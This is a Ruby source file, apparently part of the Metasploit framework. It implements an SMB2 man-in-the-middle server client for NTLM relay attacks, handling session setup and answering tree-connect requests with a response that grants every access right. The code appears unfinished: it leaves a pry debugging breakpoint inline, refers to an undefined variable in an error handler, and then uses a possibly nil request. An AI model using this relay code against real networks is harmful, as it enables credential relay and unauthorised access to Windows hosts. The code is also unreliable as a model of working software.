module Msf::Exploit::Remote::SMB::Mitm

  # This class represents a single connected client to the server. It stores and processes connection specific related
  # information.
  # Has overridden methods than allow smb relay attacks.
  class MITMServerClient < ::RubySMB::Server::ServerClient

    #
    # Handle an authenticated request. This is the main handler for all requests after the connection has been
    # authenticated.
    #
    # @param [String] raw_request the request that should be handled
    def handle_authenticated(raw_request)
      begin
        request = RubySMB::SMB2::Packet::TreeConnectRequest.read(raw_request)
      rescue IOError, RubySMB::Error::InvalidPacket => e
        $stderr.puts("Caught a #{e.class} while reading the SMB2 #{request_class} (#{e.message})")
        # response = RubySMB::SMB2::Packet::ErrorPacket.new
      end

      require 'pry'
      binding.pry

      response = RubySMB::SMB2::Packet::TreeConnectResponse.new
      response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_NETWORK_SESSION_EXPIRED.value
      response.smb2_header.message_id = request.smb2_header.message_id
      response.smb2_header.session_id = @session_id

      # Credits
      response.smb2_header.credit_charge = 0
      response.smb2_header.credits = 1

      # Share Type
      response.share_type = 0

      # Maximal Access
      response.maximal_access[:read_data] = 1
      response.maximal_access[:write_data] = 1
      response.maximal_access[:append_data] = 1
      response.maximal_access[:read_ea] = 1
      response.maximal_access[:write_ea] = 1
      response.maximal_access[:execute] = 1
      response.maximal_access[:delete_child] = 1
      response.maximal_access[:read_attr] = 1
      response.maximal_access[:write_attr] = 1
      response.maximal_access[:delete_access] = 1
      response.maximal_access[:read_control] = 1
      response.maximal_access[:write_dac] = 1
      response.maximal_access[:write_owner] = 1

      @state = :session_setup

      send_packet(response)
    end

    #
    # Run the processing loop to receive and handle requests. This loop runs until an exception occurs or the
    # dispatcher socket is closed.
    #
    def run
      loop do
        begin
          raw_request = recv_packet
        rescue RubySMB::Error::CommunicationError
          break
        end

        case @state
        when :negotiate
          handle_negotiate(raw_request)
        when :session_setup
          handle_session_setup(raw_request)
        when :authenticated
          handle_authenticated(raw_request)
        end

        break if @dispatcher.tcp_socket.closed?
      end
    end


    def do_session_setup_smb2(request)
      result = process_gss(request.buffer)
      return if result.nil?

      response = ::RubySMB::SMB2::Packet::SessionSetupResponse.new
      response.smb2_header.credits = 1
      response.smb2_header.message_id = request.smb2_header.message_id
      response.smb2_header.session_id = @session_id = @session_id || SecureRandom.random_bytes(4).unpack1('V')

      if result.is_a?(::Net::NTLM::Message)
        response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED.value
        response.buffer = result.serialize

        if @dialect == '0x0311'
          update_preauth_hash(response)
        end

        return response
      else
        response.smb2_header.nt_status = result.nt_status.value
        response.buffer = result.buffer
      end


      update_preauth_hash(request) if @dialect == '0x0311'
      if result.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
        @state = :authenticated
        @identity = result.identity
        @session_key = @gss_authenticator.session_key
      elsif result.nt_status == WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED && @dialect == '0x0311'
        update_preauth_hash(response)
      end

      response
    end
  end
end
